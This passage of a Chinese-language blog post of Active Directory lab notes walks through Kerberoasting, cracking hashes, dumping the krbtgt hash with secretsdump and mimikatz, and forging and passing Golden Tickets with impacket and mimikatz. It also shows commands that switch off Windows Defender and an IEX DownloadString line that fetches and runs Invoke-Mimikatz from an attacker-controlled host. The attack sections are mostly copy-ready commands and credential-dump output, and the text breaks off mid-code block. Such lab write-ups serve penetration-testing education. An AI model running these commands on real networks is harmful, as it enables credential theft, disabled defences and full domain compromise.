<h3 id="GetUserSPNs-impacket-set-AD-as-target-in-kali"><a href="#GetUserSPNs-impacket-set-AD-as-target-in-kali" class="headerlink" title="GetUserSPNs (impacket) [set AD as target (in kali)]"></a>GetUserSPNs (impacket) [set AD as target (in kali)]</h3><p>這個做法必須要有符合相關存取權限的 client 的密碼才能 (無論有沒有開 pre-authentication 都一樣)<br><code>GetUserSPNs.py training.local/astar:P@ssw0rd  -dc-ip 192.168.43.147  -outputfile ./hash_impacket -request-user svc_account</code><br> <img src="/img/2020/windows_ad/windows_AD_lab3_17.png" alt=""></p>
<h2 id="Brute-Force-1"><a href="#Brute-Force-1" class="headerlink" title="Brute Force"></a>Brute Force</h2><h3 id="hashcat-1"><a href="#hashcat-1" class="headerlink" title="hashcat"></a>hashcat</h3><p><code>hashcat -m 13100 ./hash /usr/share/wordlists/rockyou.txt --force</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_15.png" alt=""></p>
<h3 id="John-the-Ripper-1"><a href="#John-the-Ripper-1" class="headerlink" title="John the Ripper"></a>John the Ripper</h3><p><code>john --wordlist=/usr/share/wordlists/rockyou.txt ./hash</code><br><img src="/img/2020/windows_ad/windows_AD_lab3_14.png" alt=""></p>
<hr>
<h1 id="LAB-4-Pass-the-Ticket-Golden-Ticket"><a href="#LAB-4-Pass-the-Ticket-Golden-Ticket" class="headerlink" title="LAB 4 Pass the Ticket (Golden Ticket)"></a>LAB 4 Pass the Ticket (Golden Ticket)</h1><hr>
<h2 id="What-is-Golden-Ticket"><a href="#What-is-Golden-Ticket" class="headerlink" title="What is Golden Ticket?"></a>What is Golden Ticket?</h2><p>以一張圖來說</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2015/04/Visio-GoldenTicket-Comms.png" alt=""><br>ref: <a href="https://adsecurity.org/wp-content/uploads/2015/04/Visio-GoldenTicket-Comms.png" target="_blank" rel="noopener">https://adsecurity.org/wp-content/uploads/2015/04/Visio-GoldenTicket-Comms.png</a></p>
<p>要偽造 <code>Golden Ticket</code> 的前提是取得 <code>krbtgt</code> 的 NTLM hash<br>試想一下，如果我們取得了 <code>krbtgt</code> 的 NTLM hash, 則我們是不是就可以直接跳過 AS-REQ 和 AS-REP 取得 TGT 的過程了<br>我們可以自己用 <code>krbtgt</code> 的 NTLM hash 自己偽造一張 TGT 然後取得 Server Ticket, 也因為我們用 <code>krbtgt</code> 的身份進行驗證的<br>這個身份相當於 KDC 的管理者，對所有的服務都有 access 的權限，是真正的意義上的暢行無阻</p>
<p>藉由上面的lab, 我們已經取得了 Service Account 的密碼了，我們可以藉由此帳戶更進一步去 leak krbtgt 的 NTLM hash</p>
<h2 id="How-to-get-NTLM-hash"><a href="#How-to-get-NTLM-hash" class="headerlink" title="How to get NTLM hash?"></a>How to get NTLM hash?</h2><ul>
<li>mimikatz [local]</li>
<li>secretsdump.py (from impacket) [kali]</li>
<li>import powersploit for executing mimikatz</li>
<li>DCsync, the concept will be presented at ACL session [local]</li>
</ul>
<h2 id="Exploit-with-Golden-Ticket"><a href="#Exploit-with-Golden-Ticket" class="headerlink" title="Exploit with Golden Ticket"></a>Exploit with Golden Ticket</h2><h3 id="Impacket-kali-set-AD-as-target"><a href="#Impacket-kali-set-AD-as-target" class="headerlink" title="Impacket (kali) [set AD as target]"></a>Impacket (kali) [set AD as target]</h3><ol>
<li>Dump hash<ul>
<li>Executed from kali using impacket example (secretsdump.py)</li>
</ul>
</li>
<li>Forge golden ticket<ul>
<li>Executed from kali using impacket example (ticketer)</li>
</ul>
</li>
<li>Pass the ticket<ul>
<li>Use this TGT in normal TGS-REQuest</li>
<li>Executed from kali using impacket example (smbexec, psexec, wmiexec)</li>
</ul>
</li>
</ol>
<h4 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h4><p><code>secretsdump.py svc_account:&#39;Password!&#39;@192.168.43.147 -just-dc-user krbtgt</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_1.png" alt=""></p>
<p>注意使用者的權限也有關聯，如果用一般使用者就無法 leak<br><img src="/img/2020/windows_ad/windows_AD_lab4_2.png" alt=""></p>
<p>如果攻擊者已經取得 KDC 的 admin 帳戶的話可以 leak 任意帳戶的 NTLM hash (廢話)<br>因為 Golden Ticket 太容易經過 IR 察覺出異狀了，所以有些 APT team 會透過 admin 帳戶再取得 Service Account 的 NTLM hash<br>藉由這樣可以偽造 <code>Silver Ticket</code> 達成持續性滲透，因此透過 admin 撈出其他帳戶的 NTLM hash 也是有必要的<br><img src="/img/2020/windows_ad/windows_AD_lab4_3.png" alt=""></p>
<h4 id="Get-domain-sid"><a href="#Get-domain-sid" class="headerlink" title="Get domain sid"></a>Get domain sid</h4><p><code>lookupsid.py training.local/svc_account:&#39;Password!&#39;@192.168.43.147</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_4.png" alt=""></p>
<h4 id="Forge-golden-ticket"><a href="#Forge-golden-ticket" class="headerlink" title="Forge golden ticket"></a>Forge golden ticket</h4><p><code>ticketer.py -nthash 4785a51c191306d52946af288b7ad2eb -domain-sid S-1-5-21-2501991368-4163896689-842069156  -domain training.local svc_account</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_5.png" alt=""></p>
<h4 id="Pass-the-ticket"><a href="#Pass-the-ticket" class="headerlink" title="Pass the ticket"></a>Pass the ticket</h4><p>在做之前記得在 <code>/etc/hosts</code> 把 ad 的 domain assign 到正確的 ip<br><img src="/img/2020/windows_ad/windows_AD_lab4_0.png" alt=""></p>
<p>[psexec]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">impacket 套件內的 psexec 是一個即有全交互也有半交互的遠程命令執行工具，可運用於多種環境，包括 webshell 環境、rdp 環境、 socks 環境等。</span><br><span class="line"></span><br><span class="line">psexec.exe 始於微軟的 pstools 套件，用於管理員遠程管理 windows 主機資產，在滲透測試中也經常用來對遠程計算機執行命令。</span><br><span class="line"></span><br><span class="line">與微軟官方的 psexec.exe 做對比，官方 psexec.exe 執行遠程命令會在遠程主機新稱一個 PSEXEC 的服務，並且命令執行後會一直存在，容易被管理人員發現並判斷有入侵行為。 impacket 套件內的 psexec ，執行命令之後會刪除對應的服務，隱蔽性更佳，而且 impacket 套件內的 psexec 支援 PTH (Pass The Hash)。</span><br></pre></td></tr></table></figure></p>
<p>Payload:<br><code>export KRB5CCNAME=svc_account.ccache</code><br><code>psexec.py -k -no-pass TRAINING.LOCAL/svc_account@DC01.training.local -dc-ip 192.168.43.147 -target-ip 192.168.43.147 -debug</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_6.png" alt=""><br>藉由訪問 SPN 為 <code>CIFS/DC01.TRAINING.LOCAL</code> 的服務取得他的 Services Account 控制權</p>
<p>要注意如果 Golden Ticket 給錯的話就會連線失敗:<br><img src="/img/2020/windows_ad/windows_AD_lab4_6_krbtgt_wrong.png" alt=""> </p>
<p>除了用 Ticket 登入之外，psexec 也支援用 NTLM hash 登入<br><code>psexec.py -hashes 00000000000000000000000000000000:fbdcd5041c96ddbd82224270b57f11fc TRAINING.LOCAL/svc_account@DC01.training.local &quot;whoami&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_9.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab4_11.png" alt=""><br><code>hashes</code> 參數格式為 <code>LMHASH:NTHASH</code>, 該 hash 來自於 windows server 2008, 系統預設不支援 LM hash, 因此 LM hash 可以設定為任意值</p>
<p>不過 <code>krbtgt</code> 倒是沒辦法這樣子用就是了<br><img src="/img/2020/windows_ad/windows_AD_lab4_13.png" alt=""></p>
<p>[wmiexec]<br>先說說 <code>psexec</code> 的缺點<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">內網滲透中經常用到 psexec 這個工具，可以很方便的得到一個半交互式的 cmd shell。</span><br><span class="line"></span><br><span class="line">但是 psexec 也有一些問題─ psexec 需要對方開啟 ADMIN$ 共享，而且需要安裝服務，且該服務在 psexec 退出時有可能刪除失敗，這個情況偶爾會發生。</span><br><span class="line"></span><br><span class="line">安裝服務會留下明顯的日誌，而且服務沒有被刪除的話管理員很容易就會發現。</span><br></pre></td></tr></table></figure></p>
<p>為此就有了 <code>wmiexec</code>, 在說 wmiexec 之前先介紹一下 <code>wmi</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmi 的全稱是 Windows management instrumentation，它會出現在所有的 Windows 系統中，</span><br><span class="line">由一組強大的工具組成，用於管理本地或遠端的 Windows 系統，假如攻擊者利用 wmi 進行攻擊，</span><br><span class="line">Windows 系統預設不會將這些行為寫入到日誌中，可以做到無日誌攻擊，</span><br><span class="line">且攻擊腳本無需寫入到硬碟中，增加了隱蔽性。</span><br></pre></td></tr></table></figure></p>
<p>下面介紹 <code>wmiexec</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基本上 psexec 能用的地方，wmiexec 也能夠使用。</span><br><span class="line">整個過程是先透過 WMI 使用帳號密碼或 NTLM 認證連接到遠端主機，如果提供了帳號密碼，則用這個帳號密碼建立一個到目標 (ad) 的 IPC 連線。</span><br><span class="line">隨後 WMI 會建立一個共享資料夾，用於遠端讀取命令的執行結果。當用戶輸入命令， WMI 創建程序 (create process) 執行該命令，然後把結果輸出到文件，這個文件位於之前建立的共享資料夾中。</span><br><span class="line">最後透過 FSO 組件訪問共享資料夾裡面的結果文件，將結果輸出。當結果讀取完成時，調用 WMI 執行命令刪除結果文件。最後當 WMIEXEC 退出時，刪除共享資料夾。</span><br></pre></td></tr></table></figure></p>
<p>看完之後又去補了一下 FSO 是什麼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FSO (FileSystemObjec) 是微軟 VBA 的一個對文件操作的物件，該物件可以進行讀取、新建、修改、刪除目錄以及文件的操作，是在 VBA 中非常有用的一個物件。</span><br><span class="line">但是因為權限控制的問題，FSO 很容易成為一個公開的後門遭有心人士利用。</span><br></pre></td></tr></table></figure></p>
<p>最後再補充一下 <code>ADMIN$</code> 和 <code>IPC$</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">IPC$、ADMIN$、C$、D$都是什麼?</span><br><span class="line"></span><br><span class="line">IPC$(Internet Process Connection)可以被理解為一種“專用管道”，可以在連線雙方建立一條安全的通道，實現對遠端計算機的訪問。Windows NT/2000/XP提供了IPC$功能的同時，在初次安裝系統時還開啟了預設共享，即所有的邏輯共享(C$,D$,E$……)和系統目錄(ADMIN$)共享。所有這些共享的目的，都是為了方便管理員的管理，但在有意無意中，導致了系統安全性的隱患。</span><br><span class="line"></span><br><span class="line">IPC連接是Windows NT及以上系統中特有的遠端網路登陸功能，其功能相當於Unix中的Telnet,由於IPC$功能需要用到Windows NT中的很多DLL函數，所以不能在Windows 9.x中運行。 </span><br><span class="line">也就是說只有nt/2000/xp才可以建立ipc$連接,98/me是不能建立ipc$連接的</span><br><span class="line"></span><br><span class="line">微軟在不經意間造成的隱患，引起了很多關注，關於他們的種種說法也流傳於網路間。看看下面幾種流行的理論，你是不是也有同樣的看法呢?</span><br><span class="line"></span><br><span class="line">觀點一：預設共享本身就是漏洞，因此要避免安全隱患，必須刪除所有的預設共享。</span><br><span class="line"></span><br><span class="line">觀點二：預設共享就好像普通共享一樣，任何人都可以隨意使用ADMIN$，C$，D$等共享從你電腦裡偷東西。</span><br><span class="line"></span><br><span class="line">觀點三：IPC$是可以刪除的，而且不會再次出現。</span><br><span class="line"></span><br><span class="line">觀點四：要想刪除預設共享，只要在Windows開機指令碼中建立一個批處理檔案就能實現。</span><br></pre></td></tr></table></figure></p>
<p>ref:<a href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/536889/" target="_blank" rel="noopener">https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/536889/</a></p>
<p>Payload:<br><code>export KRB5CCNAME=svc_account.ccache</code><br><code>wmiexec.py -k -no-pass TRAINING.LOCAL/svc_account@DC01.training.local -dc-ip 192.168.43.147 -debug</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_7.png" alt=""><br>藉由訪問 SPN 為 <code>HOST/DC01.TRAINING.LOCAL</code> 的服務取得他的 Services Account 控制權</p>
<p>記得一定要照上面的方式輸入，不能任意將 <code>domain</code> 替換成 IP, 不然會像這樣<br><img src="/img/2020/windows_ad/windows_AD_lab4_8.png" alt=""></p>
<p>除了用 Ticket 登入之外，wmiexec 也支援用 NTLM hash 登入<br><code>wmiexec.py -hashes 00000000000000000000000000000000:fbdcd5041c96ddbd82224270b57f11fc TRAINING.LOCAL/svc_account@DC01.training.local &quot;whoami&quot;</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_9.png" alt=""><br><code>hashes</code> 參數格式為 <code>LMHASH:NTHASH</code>, 該 hash 來自於 windows server 2008, 系統預設不支援 LM hash, 因此 LM hash 可以設定為任意值<br><img src="/img/2020/windows_ad/windows_AD_lab4_10.png" alt=""></p>
<p>不過 <code>krbtgt</code> 倒是沒辦法這樣子用就是了<br><img src="/img/2020/windows_ad/windows_AD_lab4_12.png" alt=""></p>
<p>相關資料參考:<br><a href="http://baijiahao.baidu.com/s?id=1647063115925232176" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1647063115925232176</a><br><a href="https://www.secpulse.com/archives/32197.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/32197.html</a><br><a href="https://www.cnblogs.com/sup3rman/p/12381874.html" target="_blank" rel="noopener">https://www.cnblogs.com/sup3rman/p/12381874.html</a><br><a href="https://blog.csdn.net/jiumingmao11982/article/details/47305537" target="_blank" rel="noopener">https://blog.csdn.net/jiumingmao11982/article/details/47305537</a><br><a href="https://docs.microsoft.com/zh-tw/office/vba/language/reference/user-interface-help/filesystemobject-object" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/office/vba/language/reference/user-interface-help/filesystemobject-object</a></p>
<p>psexec需要對方開啟ADMIN$共享，而且需要安裝服務；另外，psexec退出時有可能服務刪除失敗，這個情況只是偶爾，</p>
<p>簡單來說，用 <code>psexec</code> 會在執行時創一個服務，並且這個服務會在結束執行的時候刪除，<code>wmiexec</code> 則是連服務都不會被創造</p>
<h3 id="mimikatz-windows-set-client-as-target"><a href="#mimikatz-windows-set-client-as-target" class="headerlink" title="mimikatz (windows)  [set client as target]"></a>mimikatz (windows)  [set client as target]</h3><ol>
<li>Dump hash<ul>
<li>Execute mimikatz on windows</li>
<li>Remotly import powersploit for executing mimikatz</li>
</ul>
</li>
<li>Forge golden Ticket<ul>
<li>Execute mimikatz on windows</li>
</ul>
</li>
<li>Pass the ticket<ul>
<li>Execute mimikatz and rubeus on windows</li>
</ul>
</li>
</ol>
<p>由於在 Lab 3 的時候我們已經爆破取得 Service account, 因此後面可以透過 <code>evil-winrm</code> get shell<br><code>gem install evil-winrm</code><br><a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">https://github.com/Hackplayers/evil-winrm</a><br>WinRM (Windows Remote Management) 是微軟針對 <code>WS-Management Protocol</code> 的實現方式，該功能愈在會在 5985 port 上, 其協議基於 SOAP 的規則上<br>用之前可以先確認一下 port 有沒有開，nmap 識別是 <code>5985 http Microsoft HTTPAPI</code></p>
<p>Payload:<br><code>evil-winrm -u svc_account -p &#39;Password!&#39; -i 192.168.43.147</code><br>進去後第一件事就是關防毒<br><code>Set-MpPreference -DisableRealtimeMonitoring $true</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_14.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab4_15.png" alt=""><br>上面只是把 Read-time Monitor 關閉，如果想把整個 windows defender 關閉則可以輸入<br><code>reg add &quot;hklm\Software\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 0x1</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_17.png" alt=""><br><img src="/img/2020/windows_ad/windows_AD_lab4_16.png" alt=""></p>
<p>關閉後我們就可以上傳 <code>mimikatz</code> 了<br><img src="/img/2020/windows_ad/windows_AD_lab4_18.png" alt=""></p>
<h4 id="Dump-hash-1"><a href="#Dump-hash-1" class="headerlink" title="Dump hash"></a>Dump hash</h4><h5 id="Execute-mimikatz-on-windows"><a href="#Execute-mimikatz-on-windows" class="headerlink" title="Execute mimikatz on windows"></a>Execute mimikatz on windows</h5><p><code>./mimikatz.exe &quot;lsadump::lsa /inject /name:krbtgt&quot; exit</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">evil-WinRM* PS C:\Users\svc_account\AppData\Local\Temp&gt; ./mimikatz.exe &quot;lsadump::lsa /inject /name:krbtgt&quot; exit</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&apos;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &apos;## v ##&apos;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &apos;#####&apos;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt</span><br><span class="line">Domain : TRAINING / S-1-5-21-2501991368-4163896689-842069156</span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line"></span><br><span class="line"> * Primary</span><br><span class="line">    NTLM : 4785a51c191306d52946af288b7ad2eb</span><br><span class="line">    LM   :</span><br><span class="line">  Hash NTLM: 4785a51c191306d52946af288b7ad2eb</span><br><span class="line">    ntlm- 0: 4785a51c191306d52946af288b7ad2eb</span><br><span class="line">    lm  - 0: c333d6d765ee18f5f1fa1f475f006601</span><br><span class="line"></span><br><span class="line"> * WDigest</span><br><span class="line">    01  812b8ed50cf335909e822f4fc1bfd85c</span><br><span class="line">    02  f015615fd824320c1fb67e990c4d199a</span><br><span class="line">    03  cd24eb99494ce2cc562beece595cd797</span><br><span class="line">    04  812b8ed50cf335909e822f4fc1bfd85c</span><br><span class="line">    05  f015615fd824320c1fb67e990c4d199a</span><br><span class="line">    06  6f90d3db80d7195ab4fed77456828925</span><br><span class="line">    07  812b8ed50cf335909e822f4fc1bfd85c</span><br><span class="line">    08  f9056ed0be1f32b4988a1f9ae3851859</span><br><span class="line">    09  f9056ed0be1f32b4988a1f9ae3851859</span><br><span class="line">    10  73da498dd70cee5ce1f262b2a93cbfd8</span><br><span class="line">    11  97e52f17d970d91b712e66f84a7c5150</span><br><span class="line">    12  f9056ed0be1f32b4988a1f9ae3851859</span><br><span class="line">    13  a73674797b37d6ca3da2cb48109524de</span><br><span class="line">    14  97e52f17d970d91b712e66f84a7c5150</span><br><span class="line">    15  22c58e9ee0d31938da09f714844a6899</span><br><span class="line">    16  22c58e9ee0d31938da09f714844a6899</span><br><span class="line">    17  f705825a7f4526b41e2f28bb371a009c</span><br><span class="line">    18  8f47a15174a7808edda4980c654acd4b</span><br><span class="line">    19  c4357a4eb0f7042a1cc25875162e49af</span><br><span class="line">    20  14a84ee2acb40937c8671c799c88062f</span><br><span class="line">    21  6699e1e76775387a8986b9818de408a0</span><br><span class="line">    22  6699e1e76775387a8986b9818de408a0</span><br><span class="line">    23  0c5c2da46304ed8904342ca0111d4f24</span><br><span class="line">    24  111509609b097a08b687499e7a44a9e7</span><br><span class="line">    25  111509609b097a08b687499e7a44a9e7</span><br><span class="line">    26  252cb69d49b26e816d0d11a9e9477771</span><br><span class="line">    27  c53df4e6432f11298e8ac41859f5f1d0</span><br><span class="line">    28  549dbe4ef0f7a2d182dd4fbe8a2e8c29</span><br><span class="line">    29  c246ed36fbe68fd5b759e68a2f3b84e0</span><br><span class="line"></span><br><span class="line"> * Kerberos</span><br><span class="line">    Default Salt : TRAINING.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 5832431f9d198a5e</span><br><span class="line"></span><br><span class="line"> * Kerberos-Newer-Keys</span><br><span class="line">    Default Salt : TRAINING.LOCALkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : f6fa0a83c7acb6a7cf1a251bcb8f6ad5d72bc5752fad6a7991b8aea3837fa3c2</span><br><span class="line">      aes128_hmac       (4096) : f9229d20c52b47a93a9c2deb2a415fd0</span><br><span class="line">      des_cbc_md5       (4096) : 5832431f9d198a5e</span><br><span class="line"></span><br><span class="line"> * NTLM-Strong-NTOWF</span><br><span class="line">    Random Value : d29793471283645374811fa11d25ad8b</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_account\AppData\Local\Temp&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果要 leak 全部的資訊則可以不指定 name<br><code>./mimikatz.exe &quot;lsadump::lsa /inject&quot; exit</code></p>
<h5 id="Remotly-import-powersploit-for-executing-mimikatz"><a href="#Remotly-import-powersploit-for-executing-mimikatz" class="headerlink" title="Remotly import powersploit for executing mimikatz"></a>Remotly import powersploit for executing mimikatz</h5><p><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command &#39;privilege::debug &quot;lsadump::lsa /patch /name:krbtgt&quot; exit&#39;</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_19.png" alt=""></p>
<h4 id="Forge-golden-Ticket"><a href="#Forge-golden-Ticket" class="headerlink" title="Forge golden Ticket"></a>Forge golden Ticket</h4><h5 id="Execute-mimikatz-and-rubeus-on-windows"><a href="#Execute-mimikatz-and-rubeus-on-windows" class="headerlink" title="Execute mimikatz and rubeus on windows"></a>Execute mimikatz and rubeus on windows</h5><p>※Create a Golden  Ticket</p>
<p>首先取得<code>主機</code>的 <code>sid</code> 方便後面創 Golden Ticket 需要<br><img src="/img/2020/windows_ad/windows_AD_lab4_20.png" alt=""><br>也可以用 <code>wmic useraccount get name,sid</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_20-1.png" alt=""></p>
<p>這邊取得的是包含 <code>rid</code> 的 <code>sid</code>, 關於 sid 的說明大概是這樣:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">例：S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line">上面著一串是一個標準的SID。</span><br><span class="line">第一項S標示該字串是SID；</span><br><span class="line">第二項是SID的版本號，這裡版本號是1；</span><br><span class="line">第三項是該安全識別碼 (sid) 的頒發機構，這邊是5 (NT 頒發機構)；</span><br><span class="line">最後是一系列的網域識別碼，微軟藉由這個區分其他網域管理員群組的 sid； </span><br><span class="line">最後一組是`相對識別碼` (rid)，用來定義該帳戶的身分權限。</span><br><span class="line">例子中的SID最後一段標誌位是500，這代表了它是一個系統內建管理員帳號administrator的SID，又比如最後一段是501的話則是代表GUEST的帳號。</span><br><span class="line">詳細可以在官方的連結找到</span><br><span class="line">https://docs.microsoft.com/zh-tw/troubleshoot/windows-server/identity/security-identifiers-in-windows</span><br></pre></td></tr></table></figure></p>
<p>ref:<br><a href="https://docs.microsoft.com/zh-tw/troubleshoot/windows-server/identity/security-identifiers-in-windows" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/troubleshoot/windows-server/identity/security-identifiers-in-windows</a><br><a href="https://docs.microsoft.com/zh-tw/windows/security/identity-protection/access-control/security-identifiers" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/windows/security/identity-protection/access-control/security-identifiers</a><br><a href="https://www.lijyyh.com/2015/08/sid-deep-dive.html" target="_blank" rel="noopener">https://www.lijyyh.com/2015/08/sid-deep-dive.html</a><br><a href="https://www.cnblogs.com/mq0036/p/3518553.html" target="_blank" rel="noopener">https://www.cnblogs.com/mq0036/p/3518553.html</a></p>
<p>使用 <code>mimikatz</code> 創建一個 Golden Ticket, 我們只需要到 <code>網域識別碼</code> (domain) 的 sid 就好</p>
<p><code>./mimikatz.exe &quot;kerberos::golden /user:administrator /domain:training.local  sid:S-1-5-21-2501991368-4163896689-842069156  /krbtgt:4785a51c191306d52946af288b7ad2eb  /ticket:administrator.golden.kirbi&quot; exit</code><br><img src="/img/2020/windows_ad/windows_AD_lab4_21.png" alt=""></p>
<p>也可以直接取得 krbtgt 的 Ticket<br><img src="/img/2020/windows_ad/windows_AD_lab4_21-1.png" alt=""></p>
<p>如果使用 rubeus 的話就會分成兩個步驟</p>
<h4 id="Pass-the-ticket-1"><a href="#Pass-the-ticket-1" class="headerlink" title="Pass the ticket"></a>Pass the ticket</h4><h5 id="Convert-kirbi-to-ccache"><a href="#Convert-kirbi-to-ccache" class="headerlink" title="Convert kirbi to ccache"></a>Convert kirbi to ccache</h5><h5 id="Execute-mimikatz-and-rubeus-on-windows-1"><a href="#Execute-mimikatz-and-rubeus-on-windows-1" class="headerlink" title="[Execute mimikatz and rubeus on windows]"></a>[Execute mimikatz and rubeus on windows]</h5><p>原本打算在本地做 Pass the ticket attack, 但碰到一個巨大的瓶頸，還好解決了QQ</p>
<p>首先我們要先取得 luid(登入識別碼) by <code>klist</code><br>可以透過 <code>klist</code> 取得現在的 luid</p>
<p>之前一直遇到這個問題<br><img src="/img/2020/windows_ad/windows_AD_lab4_22.png" alt=""><br>最後找到解法是只要 <code>re-enable logon Session</code> 就好了，或稱 <code>re registered session</code><br><code>Enable-PSSessionConfiguration</code><br><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-pssessionconfiguration?view=powershell-7.1" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-pssessionconfiguration?view=powershell-7.1</a><br><img src="/img/2020/windows_ad/windows_AD_lab4_22-2.png" alt=""></p>
<p>雖然可以用 <code>rubeus &quot;klist&quot;</code> 取得 luid, 但如果沒有解決上面的問題在後面透過 mimikatz 和 Rubeus 進行 pass the ticket 的時候還是會有問題<br><img src="/img/2020/windows_ad/windows_AD_lab4_22-3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 